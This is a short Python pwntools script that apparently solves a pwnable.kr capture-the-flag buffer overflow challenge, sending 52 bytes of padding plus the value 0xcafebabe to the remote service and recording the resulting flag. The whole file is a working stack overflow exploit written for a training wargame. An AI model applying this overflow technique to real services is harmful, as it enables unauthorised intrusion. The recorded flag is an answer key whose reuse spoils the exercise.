#!/usr/bin/env python3

from pwn import *

addr = "pwnable.kr"
port = 9000

# -0x2c = -44 is where the input we give it gets loaded
# +8 is where the key is
# so we need 8-(-44)=52 padding + 4 payload

padding_size = 52
payload = p32(0xcafebabe)

exploit = b'A'*padding_size + payload
r = remote(addr, port)
r.sendline(exploit)
r.interactive()

# FLAG: daddy, I just pwned a buFFer :)
